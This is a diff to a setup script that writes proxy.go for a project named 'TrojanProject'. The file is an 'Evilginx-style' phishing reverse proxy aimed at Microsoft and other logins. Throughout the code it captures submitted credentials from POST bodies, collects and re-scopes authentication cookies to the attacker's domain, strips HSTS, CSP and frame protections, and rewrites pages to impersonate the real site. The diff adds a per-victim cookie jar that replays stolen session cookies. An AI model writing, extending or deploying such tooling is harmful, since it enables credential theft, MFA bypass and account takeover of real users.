@@ -101,6 +101,7 @@ EOF
 
 # B. proxy.go (Cookie Re-Scoper & Header Spoofing)
 # B. proxy.go (Final Stable – Microsoft‑aware)
+# B. proxy.go (Evilginx-style reverse proxy with goquery and cookie jar)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 
@@ -115,7 +116,53 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/PuerkitoBio/goquery"
 )
+
+// ==================== Cookie Jar ====================
+// Store cookies per session (key = client IP + User-Agent)
+var cookieJars = make(map[string]*http.CookieJar)
+var jarMutex sync.RWMutex
+
+func getCookieJar(key string) http.CookieJar {
+	jarMutex.RLock()
+	jar, ok := cookieJars[key]
+	jarMutex.RUnlock()
+	if ok {
+		return jar
+	}
+	jarMutex.Lock()
+	defer jarMutex.Unlock()
+	jar = &syncCookieJar{
+		cookies: make(map[string][]*http.Cookie),
+	}
+	cookieJars[key] = jar
+	return jar
+}
+
+type syncCookieJar struct {
+	mu      sync.RWMutex
+	cookies map[string][]*http.Cookie
+}
+
+func (j *syncCookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
+	j.mu.Lock()
+	defer j.mu.Unlock()
+	key := u.Host
+	j.cookies[key] = cookies
+}
+
+func (j *syncCookieJar) Cookies(u *url.URL) []*http.Cookie {
+	j.mu.RLock()
+	defer j.mu.RUnlock()
+	key := u.Host
+	cookies := j.cookies[key]
+	if cookies == nil {
+		return []*http.Cookie{}
+	}
+	return cookies
+}
 
 // ==================== Session Management ====================
 
@@ -203,7 +250,6 @@ func extractCredentials(bodyStr string) (username, password string) {
 }
 
 func rewriteCSP(csp string, myHost string) string {
-	// Only rewrite if CSP exists; never add a fallback.
 	ourOrigin := "https://" + myHost
 	for _, dir := range []string{"default-src", "script-src", "style-src", "img-src", "connect-src"} {
 		re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
@@ -225,16 +271,63 @@ func isWebAuthnPath(path string) bool {
 }
 
 func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
-	// Minimal modifications for WebAuthn
 	resp.Header.Del("Strict-Transport-Security")
 	resp.Header.Del("Content-Security-Policy")
 	resp.Header.Del("X-Frame-Options")
-	// Do NOT rewrite cookies or body for WebAuthn
 }
 
-// isMicrosoftTarget checks if the target is Microsoft-related.
 func isMicrosoftTarget(t *Target) bool {
 	return strings.Contains(t.BaseDomain, "live.com") || strings.Contains(t.BaseDomain, "microsoftonline.com")
+}
+
+// rewriteHTML uses goquery to safely rewrite the domain in attributes and script content.
+func rewriteHTML(htmlStr, oldDomain, newDomain string) (string, error) {
+	doc, err := goquery.NewDocumentFromReader(strings.NewReader(htmlStr))
+	if err != nil {
+		return htmlStr, err
+	}
+
+	// Replace domain in all attribute values that contain URLs
+	attrSelectors := []string{"[href]", "[src]", "[action]", "[data-url]", "[data-src]", "[data-href]"}
+	for _, sel := range attrSelectors {
+		doc.Find(sel).Each(func(i int, s *goquery.Selection) {
+			for _, attr := range []string{"href", "src", "action", "data-url", "data-src", "data-href"} {
+				if val, ok := s.Attr(attr); ok {
+					if strings.Contains(val, oldDomain) {
+						newVal := rewriteDomainInString(val, oldDomain, newDomain)
+						s.SetAttr(attr, newVal)
+					}
+				}
+			}
+		})
+	}
+
+	// Replace domain in inline style URLs (background-image, etc.)
+	doc.Find("*").Each(func(i int, s *goquery.Selection) {
+		if style, ok := s.Attr("style"); ok {
+			if strings.Contains(style, oldDomain) {
+				newStyle := rewriteDomainInString(style, oldDomain, newDomain)
+				s.SetAttr("style", newStyle)
+			}
+		}
+	})
+
+	// Replace domain in script text, but only when it looks like a URL
+	doc.Find("script").Each(func(i int, s *goquery.Selection) {
+		if scriptText := s.Text(); scriptText != "" && strings.Contains(scriptText, oldDomain) {
+			// Simple replacement – risk of breaking code, but usually safe for URLs
+			newText := rewriteDomainInString(scriptText, oldDomain, newDomain)
+			if newText != scriptText {
+				s.SetText(newText)
+			}
+		}
+	})
+
+	html, err := doc.Html()
+	if err != nil {
+		return htmlStr, err
+	}
+	return html, nil
 }
 
 // ==================== Main Proxy Function ====================
@@ -245,6 +338,22 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	myHost := r.Host
 	sessionKey := getSessionKey(r)
 	isMsft := isMicrosoftTarget(t)
+
+	// Set up cookie jar for this session
+	cookieJar := getCookieJar(sessionKey)
+	proxy.Transport = &http.Transport{
+		// Use a custom transport that adds the stored cookies to outgoing requests
+	}
+	// Override the Director to add cookies from the jar
+	originalDirector := proxy.Director
+	proxy.Director = func(req *http.Request) {
+		originalDirector(req)
+		// Add cookies from jar for the target domain
+		cookies := cookieJar.Cookies(remote)
+		for _, c := range cookies {
+			req.AddCookie(c)
+		}
+	}
 
 	// ---------- Request Modifications ----------
 	r.Host = remote.Host
@@ -274,9 +383,6 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		r.Header.Del("Referer")
 	}
 
-	// Do NOT set X-Forwarded-Host to avoid confusing Microsoft's CSRF checks
-	// r.Header.Set("X-Forwarded-Host", myHost)  // disabled
-
 	// Capture POST bodies (credentials)
 	if r.Method == "POST" {
 		body, _ := io.ReadAll(r.Body)
@@ -302,11 +408,11 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			return nil
 		}
 
-		// 1. HSTS & CT removal (always)
+		// 1. HSTS & CT removal
 		resp.Header.Del("Strict-Transport-Security")
 		resp.Header.Del("Expect-CT")
 
-		// 2. CORS handling (always)
+		// 2. CORS handling
 		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
 		}
@@ -314,7 +420,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("Access-Control-Allow-Methods")
 		resp.Header.Del("Access-Control-Allow-Headers")
 
-		// 3. Recursive header rewriting (always)
+		// 3. Recursive header rewriting (replace original domain with our domain)
 		for header, values := range resp.Header {
 			for i, v := range values {
 				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
@@ -323,7 +429,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 4. Security headers removal (always)
+		// 4. Security headers removal
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Feature-Policy")
 		resp.Header.Del("Referrer-Policy")
@@ -334,21 +440,25 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 				resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
 			}
 		} else {
-			// For Microsoft, remove CSP entirely to avoid breaking the page
 			resp.Header.Del("Content-Security-Policy")
 		}
 
-		// 6. Cookie re‑scoping & exfiltration (always)
+		// 6. Cookie handling: store in jar AND re‑scope to our domain
 		oldCookies := resp.Cookies()
 		resp.Header.Del("Set-Cookie")
 		var authCookies []*http.Cookie
 
+		// Store cookies in jar for future requests to the real service
+		if len(oldCookies) > 0 {
+			cookieJar.SetCookies(remote, oldCookies)
+		}
+
 		for _, c := range oldCookies {
-			// Re-scope cookie to our domain
+			// Re‑scope cookie to our domain for the client
 			c.Domain = myHost
 			http.SetCookie(w, c)
 
-			// Collect only essential cookies (match AuthCookies)
+			// Collect essential cookies (match AuthCookies)
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					authCookies = append(authCookies, c)
@@ -381,17 +491,29 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		// 7. Body rewriting (skip for Microsoft to preserve login flow)
 		if !isMsft {
 			contentType := resp.Header.Get("Content-Type")
-			if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "text/plain") ||
-				strings.Contains(contentType, "application/javascript") || strings.Contains(contentType, "application/json") {
+			if strings.Contains(contentType, "text/html") {
+				// Use goquery to rewrite HTML
 				oldBody, _ := io.ReadAll(resp.Body)
 				bodyStr := string(oldBody)
 
-				newContent := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
-				// Additional replacements for common Microsoft domains (but we skip for Microsoft anyway)
-				newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
-				newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
+				newBody, err := rewriteHTML(bodyStr, t.BaseDomain, myHost)
+				if err != nil {
+					// Fallback to simple string replace
+					newBody = rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
+				}
+				// Additional replacements for common Microsoft domains (if any)
+				newBody = strings.ReplaceAll(newBody, "login.microsoftonline.com", myHost)
+				newBody = strings.ReplaceAll(newBody, "login.live.com", myHost)
 
-				bodyBytes := []byte(newContent)
+				bodyBytes := []byte(newBody)
+				resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
+				resp.ContentLength = int64(len(bodyBytes))
+				resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
+			} else if strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
+				oldBody, _ := io.ReadAll(resp.Body)
+				bodyStr := string(oldBody)
+				newBody := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
+				bodyBytes := []byte(newBody)
 				resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
 				resp.ContentLength = int64(len(bodyBytes))
 				resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
